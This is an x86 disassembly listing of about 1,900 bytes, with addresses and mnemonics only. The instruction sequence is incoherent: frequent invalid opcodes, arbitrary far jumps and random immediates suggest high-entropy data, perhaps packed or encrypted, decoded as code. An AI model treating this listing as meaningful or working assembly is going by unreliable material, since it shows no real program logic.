  401fd2:	test   BYTE PTR [eax+0x6d6fb7be],0xf0
  401fd9:	jmp    0x401f95
  401fdb:	retf   
  401fdc:	lahf   
  401fdd:	inc    ebp
  401fde:	dec    edi
  401fdf:	pop    edx
  401fe0:	adc    BYTE PTR [eax+edx*8-0x16],dl
  401fe4:	add    edi,DWORD PTR [esi+0x58]
  401fe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fe8:	push   cs
  401fe9:	pop    es
  401fea:	fcom   st(0)
  401fec:	mov    BYTE PTR [ecx-0x7],bh
  401fef:	mov    bh,BYTE PTR [esi-0x33664c9a]
  401ff5:	and    BYTE PTR [eax+0x73a9b9a2],dl
  401ffb:	jbe    0x401ff0
  401ffd:	push   DWORD PTR [ecx]
  401fff:	aad    0xc6
  402001:	outs   dx,DWORD PTR ds:[esi]
  402002:	pop    eax
  402003:	dec    esp
  402004:	lahf   
  402005:	inc    esi
  402006:	mov    edi,DWORD PTR fs:[edx-0x4434c45f]
  40200d:	mov    dh,0xf9
  40200f:	or     edi,ebx
  402011:	pop    eax
  402012:	pushf  
  402013:	mov    bh,0x1
  402015:	add    esp,DWORD PTR [edx+0x77]
  402018:	outs   dx,BYTE PTR ds:[esi]
  402019:	fidivr DWORD PTR [eax-0x3b]
  40201c:	jae    0x402075
  40201e:	mov    BYTE PTR [edx],dh
  402020:	mov    edx,esi
  402022:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402023:	mov    bl,BYTE PTR [edx+0x48]
  402026:	inc    esp
  402027:	or     al,0xef
  402029:	or     al,0x6e
  40202b:	jb     0x401fb6
  40202d:	int3   
  40202e:	cwde   
  40202f:	mov    ecx,DWORD PTR [esi+0x68]
  402032:	or     eax,0xe3c4b9cf
  402037:	call   FWORD PTR [ebx-0x31]
  40203a:	aad    0x6d
  40203c:	dec    esi
  40203d:	cwde   
  40203e:	bound  eax,QWORD PTR [edi-0x6f]
  402041:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402042:	retf   0x15e8
  402045:	xlat   BYTE PTR ds:[ebx]
  402046:	lahf   
  402047:	xor    DWORD PTR [edx],edi
  402049:	out    0xf4,eax
  40204b:	adc    edi,DWORD PTR [eax-0x58013ba1]
  402051:	cmp    dh,dl
  402053:	int3   
  402054:	mov    bl,0x80
  402056:	mov    ecx,0x33a87a28
  40205b:	lock test DWORD PTR [ebx-0x8fc1f13],ecx
  402062:	xor    dl,BYTE PTR [ecx-0x1e]
  402065:	imul   esp,DWORD PTR [esi+0x5663fece],0xffffffd0
  40206c:	mov    eax,ds:0x1da28850
  402071:	jl     0x4020c8
  402073:	loop   0x4020bf
  402075:	les    edx,FWORD PTR [eax-0x5d8ad632]
  40207b:	ins    DWORD PTR es:[edi],dx
  40207c:	ret    0xd17c
  40207f:	cmp    dl,BYTE PTR [ecx]
  402081:	or     bl,dl
  402083:	xor    dh,bh
  402085:	mov    dh,0x3f
  402087:	ins    DWORD PTR es:[edi],dx
  402088:	xor    eax,0xe8d72650
  40208d:	imul   ecx,esi,0xffffffcb
  402090:	dec    ebx
  402091:	push   esi
  402092:	mov    DWORD PTR [ebp-0x696aa7be],eax
  402098:	or     BYTE PTR [edi+0x14],cl
  40209b:	and    al,0x9d
  40209d:	(bad)  
  40209e:	test   al,0xca
  4020a0:	in     al,dx
  4020a1:	pop    esi
  4020a2:	and    al,0xb4
  4020a4:	dec    edi
  4020a5:	js     0x4020d7
  4020a7:	mov    ds:0xb8470cf9,al
  4020ac:	enter  0x6dda,0x45
  4020b0:	sahf   
  4020b1:	ins    BYTE PTR es:[edi],dx
  4020b2:	and    cl,dl
  4020b4:	sub    edi,DWORD PTR [ebx-0x666508c]
  4020ba:	lods   eax,DWORD PTR ds:[esi]
  4020bb:	in     eax,0x2
  4020bd:	fstp   DWORD PTR [ebp-0x3c]
  4020c0:	mov    bh,0xa4
  4020c2:	xchg   edx,eax
  4020c3:	es xchg ebx,eax
  4020c5:	inc    ebp
  4020c6:	mov    cl,0xc8
  4020c8:	rcl    DWORD PTR ds:0x105c15fe,1
  4020ce:	inc    ebx
  4020cf:	cld    
  4020d0:	mov    bl,0x76
  4020d2:	adc    eax,0xb140b14f
  4020d7:	xchg   ecx,eax
  4020d8:	pop    edi
  4020d9:	push   esp
  4020da:	pop    es
  4020db:	dec    ecx
  4020dc:	push   0x25
  4020de:	in     al,0xa4
  4020e0:	ss jl  0x4020c5
  4020e3:	cwde   
  4020e4:	(bad)  
  4020e5:	cmp    al,0x7c
  4020e7:	and    edi,edx
  4020e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020ea:	gs jp  0x40214f
  4020ed:	(bad)  
  4020ef:	and    eax,0xf4d74e84
  4020f4:	repnz pop ss
  4020f6:	pop    ebx
  4020f7:	cmp    eax,0x7c70213
  4020fc:	hlt    
  4020fd:	sbb    BYTE PTR [ecx-0x23be928b],cl
  402103:	inc    ecx
  402104:	mov    bh,0x1
  402106:	mov    dh,0xe
  402108:	push   es
  402109:	jne    0x40217a
  40210b:	inc    esp
  40210c:	xor    dl,ah
  40210e:	lods   eax,DWORD PTR ds:[esi]
  40210f:	lds    edi,FWORD PTR [edx-0x7e0f6403]
  402115:	dec    ecx
  402116:	cmp    edi,DWORD PTR [ebx]
  402118:	adc    bl,BYTE PTR [ebp+0xc]
  40211b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40211c:	push   ds
  40211d:	adc    eax,0x918a034a
  402122:	mov    DWORD PTR [esi+0x30],ebx
  402125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402126:	(bad)  
  402127:	lds    ecx,FWORD PTR [eax]
  402129:	mov    al,ds:0x9b17c5ea
  40212e:	push   eax
  40212f:	push   0x60311e9a
  402134:	or     BYTE PTR [ebp-0x51d7d93],0x5e
  40213b:	jns    0x4021ac
  40213d:	dec    esi
  40213e:	jmp    0xfc05:0x18228379
  402145:	addr16 push edi
  402147:	das    
  402148:	adc    DWORD PTR gs:[edi+0xdc92289],esi
  40214f:	or     eax,0xc6a4c10f
  402154:	pusha  
  402155:	pop    ecx
  402156:	stc    
  402157:	add    DWORD PTR [ebp+eiz*2+0xd4af749],0x522c9664
  402162:	call   0xb2f0d233
  402167:	push   ds
  402168:	aam    0x5
  40216a:	or     al,0xb5
  40216c:	mov    BYTE PTR [edx+0x15bc0979],ch
  402172:	loopne 0x4021f1
  402174:	(bad)  
  402175:	and    DWORD PTR [ebx+0x52],esp
  402178:	test   eax,0x67c6837d
  40217d:	adc    DWORD PTR [edx],esi
  40217f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402180:	sub    cl,BYTE PTR [ebp-0x58]
  402183:	inc    esp
  402184:	xor    al,0xdf
  402186:	dec    eax
  402187:	mov    dh,0x8e
  402189:	je     0x402124
  40218b:	or     BYTE PTR [esi],dl
  40218d:	xor    al,0xc
  40218f:	out    dx,eax
  402190:	rcl    BYTE PTR [edx-0x80],cl
  402193:	popa   
  402194:	lea    ebp,[edx+0x35]
  402197:	lock dec eax
  402199:	shl    DWORD PTR [ebp+0x43],1
  40219c:	outs   dx,BYTE PTR ds:[esi]
  40219d:	enter  0x45,0x6c
  4021a1:	popa   
  4021a2:	push   edi
  4021a3:	adc    eax,0xdc0717db
  4021a8:	and    eax,0xf7da4d19
  4021ad:	adc    eax,0xeb301694
  4021b2:	fimul  WORD PTR [ecx-0x4542c8a5]
  4021b8:	out    dx,eax
  4021b9:	mov    cl,0x88
  4021bb:	cdq    
  4021bc:	stos   BYTE PTR es:[edi],al
  4021bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021be:	shl    DWORD PTR [ebx-0x62],0xf1
  4021c2:	stc    
  4021c3:	pop    es
  4021c4:	outs   dx,BYTE PTR ds:[esi]
  4021c5:	push   edx
  4021c6:	add    ch,BYTE PTR [ebx+0x20]
  4021c9:	sbb    DWORD PTR [esi],esi
  4021cb:	and    BYTE PTR ds:0x516955e,dl
  4021d1:	inc    esp
  4021d2:	pop    edx
  4021d3:	(bad)  
  4021d5:	cwde   
  4021d6:	cmp    ax,0xfe1c
  4021da:	push   esi
  4021db:	lods   eax,DWORD PTR ds:[esi]
  4021dc:	gs aas 
  4021de:	pop    di
  4021e0:	pop    ebx
  4021e1:	mov    gs,ecx
  4021e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021e4:	outs   dx,BYTE PTR ds:[esi]
  4021e5:	sbb    ebp,DWORD PTR [ebp+0x6d]
  4021e8:	aaa    
  4021e9:	dec    ecx
  4021ea:	jne    0x4021f7
  4021ec:	imul   ebx,DWORD PTR [eax+0x24],0xfac2322d
  4021f3:	mov    dl,0x2c
  4021f5:	pusha  
  4021f6:	test   al,0x23
  4021f8:	neg    DWORD PTR ds:0xc71c898d
  4021fe:	inc    esp
  4021ff:	xor    DWORD PTR [edx],ebp
  402201:	and    DWORD PTR [esi+esi*2+0x2981e33c],ecx
  402208:	jge    0x40226e
  40220a:	scas   al,BYTE PTR es:[edi]
  40220b:	add    bh,cl
  40220d:	cmp    DWORD PTR [edi-0x3a336bce],edi
  402213:	dec    edi
  402214:	stos   DWORD PTR es:[edi],eax
  402215:	add    ah,0xd8
  402218:	dec    ebp
  402219:	retf   0x5d3e
  40221c:	dec    edi
  40221d:	xor    eax,DWORD PTR [esp+esi*1+0x2f67cae2]
  402224:	inc    ebx
  402225:	shl    DWORD PTR [esi],0xa0
  402228:	jnp    0x402241
  40222a:	je     0x40221c
  40222c:	sbb    bl,al
  40222e:	jo     0x402203
  402230:	cdq    
  402231:	push   ds
  402232:	xor    BYTE PTR [ebp-0x664d4cde],bh
  402238:	inc    ebp
  402239:	cmp    BYTE PTR [eax],cl
  40223b:	lea    esi,[eax]
  40223d:	sbb    edx,ecx
  40223f:	or     BYTE PTR [ebp+0x3dc61700],ch
  402245:	inc    esi
  402246:	scas   eax,DWORD PTR es:[edi]
  402247:	jmp    0x4022c1
  402249:	fld    TBYTE PTR [eax+0x5f7eebaa]
  40224f:	xor    eax,0x74c336d3
  402254:	stos   DWORD PTR es:[edi],eax
  402255:	inc    esp
  402256:	inc    esi
  402257:	xor    eax,0x65abd120
  40225c:	pop    ecx
  40225d:	aam    0x81
  40225f:	push   eax
  402260:	arpl   WORD PTR [eax],si
  402262:	in     eax,0x22
  402264:	sub    eax,0xcf5e7545
  402269:	adc    esp,DWORD PTR [edx]
  40226b:	fwait
  40226c:	icebp  
  40226d:	lock aad 0x2f
  402270:	jmp    0x40b8:0xb2131f5d
  402277:	mov    edi,0x2def89ca
  40227c:	not    ch
  40227e:	cwde   
  40227f:	mov    esp,0x71a27261
  402284:	imul   edi,ebx,0xffffffa7
  402287:	loope  0x4022f9
  402289:	ins    BYTE PTR es:[edi],dx
  40228a:	sti    
  40228b:	sub    ecx,edi
  40228d:	lods   eax,DWORD PTR ds:[esi]
  40228e:	cwde   
  40228f:	mov    edi,0x324dd0ea
  402294:	mov    al,ds:0x33770c98
  402299:	sub    esi,DWORD PTR [esi+0x45]
  40229c:	rcr    DWORD PTR [eax-0x1ce07b02],1
  4022a2:	frstor [ebp-0x1c]
  4022a5:	sub    eax,0x589c365
  4022aa:	js     0x4022ea
  4022ac:	out    0xda,eax
  4022ae:	dec    bh
  4022b0:	inc    esi
  4022b1:	out    0x46,eax
  4022b3:	repz mov esi,0xcd4c9c31
  4022b9:	stos   BYTE PTR es:[edi],al
  4022ba:	push   0x77
  4022bc:	jo     0x402314
  4022be:	sbb    DWORD PTR [ebp-0x62c177fd],edi
  4022c4:	cmp    eax,0x19775e4e
  4022c9:	bound  esp,QWORD PTR [edx-0xa2c8cf8]
  4022cf:	xor    edx,DWORD PTR [ecx+0x32]
  4022d2:	push   ecx
  4022d3:	shl    BYTE PTR [edx+0x1ecdbfb5],0x74
  4022da:	rol    dl,0xa3
  4022dd:	add    BYTE PTR [ebp-0x10],ch
  4022e0:	pusha  
  4022e1:	push   eax
  4022e2:	aaa    
  4022e3:	pop    esi
  4022e4:	mov    eax,0xe9d248fe
  4022e9:	jge    0x4022e1
  4022eb:	push   edi
  4022ec:	push   edx
  4022ee:	stos   BYTE PTR es:[edi],al
  4022ef:	adc    ebp,DWORD PTR [edi+0x49]
  4022f2:	xor    al,0x9f
  4022f4:	mov    esi,0x318e7f00
  4022f9:	sahf   
  4022fa:	mov    al,ds:0x998cc553
  4022ff:	push   es
  402300:	mov    cl,0xa3
  402302:	mov    ecx,0x9806e4ee
  402307:	sbb    BYTE PTR [eax+edi*1-0x46],0x84
  40230c:	cmp    al,0x4
  40230e:	ins    DWORD PTR es:[edi],dx
  40230f:	out    0x6e,al
  402311:	lea    esi,[esi]
  402313:	sbb    eax,0xd2da9357
  402318:	jl     0x402317
  40231a:	iret   
  40231b:	ds dec edx
  40231d:	fs js  0x4022aa
  402320:	sbb    BYTE PTR [bx-0x2c5f],ch
  402325:	std    
  402326:	pop    ss
  402327:	or     eax,0x2231dfe7
  40232c:	in     eax,dx
  40232d:	xchg   ch,ch
  40232f:	loopne 0x402310
  402331:	(bad)  [ebx-0x1d]
  402334:	stos   DWORD PTR es:[edi],eax
  402335:	pop    ds
  402336:	push   edx
  402337:	loopne 0x402352
  402339:	(bad)  
  40233b:	outs   dx,DWORD PTR ds:[esi]
  40233c:	push   esp
  40233d:	ins    DWORD PTR es:[edi],dx
  40233e:	cli    
  40233f:	sub    eax,0xab169e48
  402344:	push   ss
  402345:	imul   eax,DWORD PTR [edi],0x75b1e9df
  40234b:	push   esi
  40234c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40234d:	fldenv [eax-0x21]
  402350:	adc    al,0x45
  402352:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402353:	sub    DWORD PTR [eax],esp
  402355:	cdq    
  402356:	shl    BYTE PTR [ebx-0x7ff9d9c3],1
  40235c:	leave  
  40235d:	pop    ebx
  40235e:	je     0x4023a6
  402360:	test   ebp,eax
  402362:	push   ecx
  402363:	and    al,0x67
  402365:	sar    DWORD PTR [edx],1
  402367:	loop   0x40235a
  402369:	fstp   DWORD PTR [ebp+0x37]
  40236c:	in     al,0x6d
  40236e:	cmp    al,BYTE PTR [ecx]
  402370:	xchg   DWORD PTR [ecx+edx*8-0x4cde9831],esp
  402377:	cmp    DWORD PTR [ecx],esp
  402379:	push   0xa
  40237b:	fwait
  40237c:	push   edx
  40237d:	inc    ecx
  40237e:	vpmacsdql ymm6,ymm4,ymm2,ymm3
  402384:	sbb    al,0x87
  402386:	dec    esp
  402387:	sbb    DWORD PTR [eax-0x9],eax
  40238a:	cmp    eax,0x6213f6ba
  40238f:	adc    DWORD PTR [ecx],edx
  402391:	mov    esi,0x4cf65947
  402396:	pop    eax
  402397:	in     al,0x88
  402399:	mov    bl,BYTE PTR [ebx]
  40239b:	dec    esi
  40239c:	dec    eax
  40239d:	retf   0x99fd
  4023a0:	mov    al,ds:0xb2961440
  4023a5:	adc    BYTE PTR [ebx-0x4f],ah
  4023a8:	loop   0x4023c7
  4023aa:	inc    esp
  4023ab:	and    eax,0xe408e60a
  4023b0:	dec    esp
  4023b1:	jle    0x40236e
  4023b3:	dec    esp
  4023b4:	xor    ecx,DWORD PTR [eax-0x10]
  4023b7:	arpl   sp,cx
  4023b9:	jb     0x4023cb
  4023bb:	iret   
  4023bc:	scas   al,BYTE PTR es:[edi]
  4023bd:	inc    edx
  4023be:	xchg   ebp,eax
  4023bf:	mov    esp,esp
  4023c1:	or     bh,BYTE PTR ds:0x8fcf10aa
  4023c7:	push   ebx
  4023c8:	xchg   esp,eax
  4023c9:	pop    ss
  4023ca:	ror    dl,1
  4023cc:	mov    ds,WORD PTR [edi]
  4023ce:	sti    
  4023cf:	ss mov edi,0x2cb2810a
  4023d5:	sbb    DWORD PTR [eax],ecx
  4023d7:	call   0xf0ff187e
  4023dc:	daa    
  4023dd:	or     ebp,esp
  4023df:	call   0x5946bad3
  4023e4:	arpl   WORD PTR [eax],bx
  4023e6:	mov    eax,esp
  4023e8:	push   ss
  4023e9:	dec    eax
  4023ea:	sbb    BYTE PTR ds:0x348693fa,ah
  4023f0:	inc    ebx
  4023f1:	xchg   eax,ecx
  4023f3:	jbe    0x402460
  4023f5:	fldpi  
  4023f7:	sub    eax,0x2e735115
  4023fc:	dec    edi
  4023fd:	imul   DWORD PTR [ecx-0x7b1e31ce]
  402403:	push   cs
  402404:	int    0x2f
  402406:	repz fwait
  402408:	repnz aas 
  40240a:	sbb    bl,BYTE PTR [ebx-0x2dbede8a]
  402410:	pop    eax
  402411:	or     al,0x43
  402413:	sbb    eax,0x7cc2c2b7
  402418:	sub    esp,DWORD PTR [edi+esi*2-0x5f]
  40241c:	xor    DWORD PTR [esi-0x7],0x7
  402420:	ins    BYTE PTR es:[edi],dx
  402421:	xor    BYTE PTR [ecx+0x32c7f07f],dl
  402427:	ret    
  402428:	sub    DWORD PTR [ebx-0x16],ebx
  40242b:	push   ss
  40242c:	mov    dl,0x75
  40242e:	add    esp,DWORD PTR [edi]
  402430:	pop    ebx
  402431:	cwde   
  402432:	xlat   BYTE PTR ds:[ebx]
  402433:	les    edi,FWORD PTR [edx+0xe]
  402436:	adc    ecx,DWORD PTR [edx-0x645b5bb0]
  40243c:	retf   0x5d9d
  40243f:	jg     0x402478
  402441:	push   esp
  402442:	or     dl,BYTE PTR [edi+ecx*1+0x265c0065]
  402449:	push   edi
  40244a:	push   cs
  40244b:	cmp    al,0xd4
  40244d:	dec    ecx
  40244e:	adc    DWORD PTR [edx],eax
  402450:	sbb    DWORD PTR ds:0x31de85ee,eax
  402456:	cmp    ecx,edx
  402458:	(bad)  
  402459:	mov    ch,0x4c
  40245b:	jp     0x40249b
  40245d:	fwait
  40245e:	mov    dh,0x51
  402460:	or     dh,BYTE PTR [edi]
  402462:	or     DWORD PTR [edx+0x11a27b29],esi
  402468:	push   esi
  402469:	mov    dl,0xb2
  40246b:	retf   
  40246c:	xchg   edx,eax
  40246d:	and    ah,BYTE PTR es:[ebp+ecx*1-0x1090af72]
  402475:	pusha  
  402476:	test   BYTE PTR [esi],bh
  402478:	hlt    
  402479:	sbb    al,al
  40247b:	jno    0x40243c
  40247d:	fst    QWORD PTR [eax-0x1e]
  402480:	sub    al,0xdb
  402482:	cmp    eax,0x8f8a9e3e
  402487:	lds    ebx,FWORD PTR [esi+0x3cc7d872]
  40248d:	xchg   edi,eax
  40248e:	xchg   ebp,eax
  40248f:	xchg   esp,eax
  402490:	lds    edi,FWORD PTR [ecx-0x7e8171d1]
  402496:	mov    esi,esi
  402498:	(bad)  
  402499:	nop
  40249a:	(bad)  
  40249b:	test   BYTE PTR [eax],bh
  40249d:	aas    
  40249e:	scas   al,BYTE PTR es:[edi]
  40249f:	push   ebx
  4024a0:	test   eax,edx
  4024a2:	sbb    BYTE PTR [ebx+0x17],bl
  4024a5:	inc    esp
  4024a6:	cwde   
  4024a7:	xlat   BYTE PTR ds:[ebx]
  4024a8:	(bad)  
  4024a9:	mov    ebx,0x69ba4ad0
  4024ae:	cmp    ecx,DWORD PTR [ecx+0x37691bb3]
  4024b4:	(bad)  
  4024b5:	shl    BYTE PTR [esi-0x9],1
  4024b8:	mov    esp,ebp
  4024ba:	cmp    BYTE PTR [ebp*4-0x354c7ef4],ah
  4024c1:	pop    eax
  4024c2:	xchg   BYTE PTR [edx],bh
  4024c4:	fcom   QWORD PTR [ebx+0x17]
  4024c7:	jnp    0x4024ba
  4024c9:	cmc    
  4024ca:	ins    DWORD PTR es:[edi],dx
  4024cb:	xlat   BYTE PTR ds:[ebx]
  4024cc:	in     eax,dx
  4024cd:	jle    0x40245f
  4024cf:	test   al,0xa8
  4024d1:	scas   eax,DWORD PTR es:[edi]
  4024d2:	add    bl,BYTE PTR [eax-0x5]
  4024d5:	pop    ss
  4024d6:	xchg   ebp,eax
  4024d7:	push   ss
  4024d8:	popa   
  4024d9:	test   bl,bl
  4024db:	pop    edx
  4024dc:	pop    DWORD PTR [eax-0x4644b391]
  4024e2:	(bad)  
  4024e3:	ins    BYTE PTR es:[edi],dx
  4024e4:	jmp    0x37e1:0xaf8f5fae
  4024eb:	sar    BYTE PTR [edi-0x513b8626],1
  4024f1:	imul   BYTE PTR [esi+0x29124cbd]
  4024f7:	or     cl,0x23
  4024fa:	fstp   QWORD PTR [ebx+0x19fca7c]
  402500:	or     al,0xb9
  402502:	sub    al,0x3a
  402504:	out    dx,al
  402505:	je     0x40257a
  402507:	xor    BYTE PTR [ecx+esi*1],ch
  40250a:	jp     0x4024bf
  40250c:	int    0x2
  40250e:	jl     0x4024fd
  402510:	pop    edi
  402511:	fstp   QWORD PTR [esi]
  402513:	adc    DWORD PTR [edx-0x1c],ecx
  402516:	push   0xffffffcf
  402518:	lods   al,BYTE PTR ds:[esi]
  402519:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40251a:	sbb    eax,0xc4d9ae4f
  40251f:	popa   
  402520:	cmc    
  402521:	out    dx,eax
  402522:	scas   eax,DWORD PTR es:[edi]
  402523:	or     al,0xae
  402525:	sbb    DWORD PTR [edx-0x60c66093],ebx
  40252b:	mul    BYTE PTR [ebp+0x1a]
  40252e:	push   0xffffffc5
  402530:	jno    0x4025ae
  402532:	and    DWORD PTR [edi+ebp*1-0x41a2d72b],esi
  402539:	xchg   BYTE PTR [edx+0x75],bl
  40253c:	stc    
  40253d:	jne    0x40255e
  40253f:	push   ebp
  402540:	xchg   ebp,eax
  402541:	xor    DWORD PTR [edi-0xd],eax
  402544:	or     al,0xbe
  402546:	xchg   ebp,eax
  402547:	sub    eax,0x92d1d05
  40254c:	gs and al,cl
  40254f:	sub    bl,dh
  402551:	and    al,0x2a
  402553:	or     eax,0x4f266554
  402558:	imul   edx,DWORD PTR [ebx-0x13eca5a5],0xffffffa7
  40255f:	aas    
  402560:	fadd   st,st(7)
  402562:	or     al,0xcf
  402564:	scas   eax,DWORD PTR es:[edi]
  402565:	ret    0x8910
  402568:	dec    edx
  402569:	xlat   BYTE PTR ds:[ebx]
  40256a:	cmp    dh,BYTE PTR [edi+eiz*1-0x22be68]
  402571:	or     BYTE PTR [edx],ah
  402573:	std    
  402574:	std    
  402575:	pop    edi
  402576:	shl    DWORD PTR [esi+0x2f],1
  402579:	jns    0x40252d
  40257b:	add    edx,DWORD PTR [ecx]
  40257d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40257e:	sub    bh,BYTE PTR [edx-0x3e780d9f]
  402584:	sub    eax,0xdff32d65
  402589:	or     edi,DWORD PTR [ecx-0x763cfed9]
  40258f:	stos   DWORD PTR es:[edi],eax
  402590:	dec    ebp
  402591:	int    0x5d
  402593:	imul   ecx,ecx,0xffffffa6
  402596:	rcl    ebp,0xbb
  402599:	loopne 0x40256d
  40259b:	pusha  
  40259c:	and    bh,bh
  40259e:	cmp    dh,BYTE PTR [edx+0x63]
  4025a1:	mov    al,BYTE PTR [ebp-0x5b]
  4025a4:	mov    al,ds:0x5357d513
  4025a9:	scas   eax,DWORD PTR es:[edi]
  4025aa:	or     eax,0x235c82e7
  4025af:	or     eax,0x4b70525c
  4025b4:	xor    al,0x78
  4025b6:	(bad)  
  4025b7:	fbld   TBYTE PTR ds:0x31950b5
  4025bd:	jle    0x402554
  4025bf:	(bad)
  4025c3:	loopne 0x4025e1
  4025c5:	aas    
  4025c6:	mov    cl,0x20
  4025c8:	repz jne 0x402643
  4025cb:	mov    bl,0xfa
  4025cd:	pushf  
  4025ce:	ret    
  4025cf:	pop    ebp
  4025d0:	(bad)  
  4025d2:	jo     0x40255f
  4025d4:	test   eax,0x69c0f153
  4025d9:	in     al,0xf
  4025db:	mov    dh,0x9f
  4025dd:	std    
  4025de:	shl    DWORD PTR [edi-0x6c97bcf6],0xe7
  4025e5:	mov    ds:0xff10bff9,al
  4025ea:	stos   DWORD PTR es:[edi],eax
  4025eb:	mov    dh,0xa8
  4025ed:	inc    esi
  4025ee:	jne    0x402622
  4025f0:	pop    ebx
  4025f1:	mov    BYTE PTR [esi-0x37],cl
  4025f4:	aas    
  4025f5:	test   BYTE PTR [ecx-0x3],cl
  4025f8:	popf   
  4025f9:	stc    
  4025fa:	mov    dl,0x90
  4025fc:	add    BYTE PTR [eax],al
  4025fe:	shl    edx,cl
  402600:	mov    edi,0x378030f3
  402605:	adc    DWORD PTR [ebp-0x63],esi
  402608:	gs xor esp,eax
  40260b:	mov    ebx,0xf44a099c
  402610:	push   ebp
  402611:	jg     0x4025ad
  402613:	pop    ecx
  402614:	ret    0x5298
  402617:	fistp  QWORD PTR [eax-0x276d145b]
  40261d:	stos   DWORD PTR es:[edi],eax
  40261e:	push   ebx
  40261f:	mov    fs,WORD PTR [ebp+0x44]
  402622:	push   ecx
  402623:	lea    ebp,[edx-0x1e0c5d98]
  402629:	jmp    0xdd01:0xfaceac20
  402630:	mov    dl,0x91
  402632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402633:	scas   al,BYTE PTR es:[edi]
  402634:	fcom   st(0)
  402636:	cdq    
  402637:	jle    0x402651
  402639:	mov    al,0x24
  40263b:	and    BYTE PTR [ecx],al
  40263d:	and    BYTE PTR [eax+0x4b17a90b],dl
  402643:	int3   
  402644:	and    eax,0xfd795832
  402649:	cmc    
  40264a:	sbb    al,0x5d
  40264c:	(bad)  
  40264d:	xchg   ecx,eax
  40264e:	cmp    eax,0x73d0461b
  402653:	mov    ah,0x7c
  402655:	cdq    
  402656:	push   0xffffffe4
  402658:	cmc    
  402659:	stos   DWORD PTR es:[edi],eax
  40265a:	jnp    0x40265f
  40265c:	mov    ch,0x81
  40265e:	int    0x9d
  402660:	pop    esi
  402661:	jge    0x402684
  402663:	icebp  
  402664:	sbb    esp,ebx
  402666:	sub    BYTE PTR [ebp+ebp*4-0x69],ch
  40266a:	rcl    ecx,cl
  40266c:	(bad)  
  40266d:	sub    eax,0xcf8ec759
  402672:	jl     0x402698
  402674:	sub    al,0xd6
  402676:	leave  
  402677:	nop
  402678:	aaa    
  402679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40267a:	loop   0x40263e
  40267c:	je     0x4026c1
  40267e:	daa    
  40267f:	icebp  
  402680:	stos   BYTE PTR es:[edi],al
  402681:	fs inc esi
  402683:	(bad)  
  402684:	iret   
  402685:	push   ss
  402686:	and    al,0x20
  402688:	mov    eax,0xa7c95b80
  40268d:	or     BYTE PTR [ecx+0x7d9723e9],bh
  402693:	fmul   DWORD PTR [ecx+0x528ff039]
  402699:	test   al,0xe1
  40269c:	jo     0x4026d6
  40269e:	data16 test al,0xad
  4026a1:	icebp  
  4026a2:	pop    edx
  4026a3:	addr16 jo 0x40262d
  4026a6:	cdq    
  4026a7:	inc    esi
  4026a8:	ror    BYTE PTR [edi-0x42560092],0x57
  4026af:	mov    cl,dl
  4026b1:	mov    ecx,es
  4026b3:	addr16 dec edi
  4026b5:	mov    bh,0xe
  4026b7:	or     eax,0x1fba3684
  4026bc:	inc    eax
  4026bd:	shr    DWORD PTR [esi],0x6f
  4026c0:	lahf   
  4026c1:	fwait
  4026c2:	mov    bl,BYTE PTR [eax-0x7a]
  4026c5:	inc    edx
  4026c6:	dec    edi
  4026c7:	imul   esi,DWORD PTR [esi+0x1504280b],0x528bada
  4026d1:	in     al,0x7f
  4026d3:	mov    DWORD PTR [esi],ebx
  4026d5:	into   
  4026d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026d7:	add    DWORD PTR [ecx-0x597a93ee],ecx
  4026dd:	mov    al,cl
  4026df:	push   ebp
  4026e0:	outs   dx,DWORD PTR ds:[esi]
  4026e1:	adc    esp,ecx
  4026e3:	adc    eax,0x5011e6b1
  4026e8:	cmovne edi,ebx
  4026eb:	cmp    BYTE PTR [esi-0x5b],al
  4026ee:	aas    
  4026ef:	mov    eax,0xf0c545f
  4026f4:	daa    
  4026f5:	or     BYTE PTR [edx-0x5d802c7a],0x60
  4026fc:	jne    0x40273f
  4026fe:	ds xor al,0xd1
  402701:	repz popf 
  402703:	mov    cl,cl
  402705:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402706:	(bad)  
  402707:	aas    
  402708:	outs   dx,BYTE PTR ds:[esi]
  402709:	sbb    DWORD PTR [ebx+0x78782f47],esi
  40270f:	test   DWORD PTR [ecx],0x9db8571f
  402715:	cwde   
  402716:	xor    DWORD PTR [ecx+0x105af7de],ebp
  40271c:	shl    DWORD PTR [ebx],0xc2
  40271f:	fmul   QWORD PTR [esi+0x3f824dc]
  402725:	(bad)  
  402727:	mov    bl,0x34
  402729:	leave  
  40272a:	leave  
  40272b:	dec    esi
  40272c:	mov    edi,0x1f531031
  402731:	jae    0x4026cc
  402733:	ret    0x3f71
  402736:	fadd   QWORD PTR gs:[edi]
  402739:	gs loope 0x4026fb
  40273c:	mov    ds:0xc77b06a,eax
  402741:	test   al,0xec
  402743:	sbb    DWORD PTR [ebp+0x4487f39],0xe6bc5ef5
  40274d:	cmp    ebx,ecx
  40274f:	push   es
  402750:	loop   0x402722
  402752:	mov    ds:0x9516a77d,al
  402757:	ja     0x402739
  402759:	out    dx,eax
  40275a:	jmp    0x32c:0x5ad8cd20
  402761:	push   cs
  402762:	add    ah,BYTE PTR [esi+eiz*1]
  402765:	repz cmp edx,DWORD PTR [edi]
  402768:	or     eax,0x265aa819
  40276d:	push   es
  40276e:	test   BYTE PTR [ecx-0x33],ah
  402771:	dec    edx
  402772:	xor    eax,0x8df53ae1
  402777:	xor    cl,BYTE PTR [edi+eiz*8]
  40277a:	test   BYTE PTR [edx],dh
  40277c:	xchg   esi,eax
  40277d:	jnp    0x4027b5
  40277f:	lods   al,BYTE PTR ds:[esi]
